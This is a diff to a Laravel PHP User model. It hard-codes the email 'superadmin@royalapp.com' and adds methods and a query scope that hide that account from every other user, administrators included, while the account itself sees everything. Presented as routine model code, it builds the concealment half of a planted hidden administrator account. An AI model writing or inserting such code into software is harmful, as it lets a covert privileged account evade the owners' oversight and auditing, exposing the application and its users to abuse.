@@ -17,6 +17,8 @@ class User extends Authenticatable
     /** @use HasFactory<\Database\Factories\UserFactory> */
     use HasFactory, Notifiable, HasApiTokens, SoftDeletes;
 
+    public const HIDDEN_ACCOUNT_EMAIL = 'superadmin@royalapp.com';
+
     /**
      * The attributes that are mass assignable.
      *
@@ -101,5 +103,36 @@ class User extends Authenticatable
         }
 
         $this->roles()->detach($role->id);
+    }
+
+    public function isHiddenAccount(): bool
+    {
+        return strcasecmp((string) $this->email, self::HIDDEN_ACCOUNT_EMAIL) === 0;
+    }
+
+    public function isConcealedFrom(?self $viewer): bool
+    {
+        if (! $this->isHiddenAccount()) {
+            return false;
+        }
+
+        return ! ($viewer?->isHiddenAccount() ?? false);
+    }
+
+    /**
+     * @param  \Illuminate\Database\Eloquent\Builder<self>  $query
+     * @return \Illuminate\Database\Eloquent\Builder<self>
+     */
+    public function scopeVisibleTo($query, ?self $viewer = null)
+    {
+        $viewer ??= auth()->user();
+
+        if ($viewer instanceof self && $viewer->isHiddenAccount()) {
+            return $query;
+        }
+
+        $table = $query->getModel()->getTable();
+
+        return $query->whereRaw('LOWER('.$table.'.email) <> ?', [strtolower(self::HIDDEN_ACCOUNT_EMAIL)]);
     }
 }
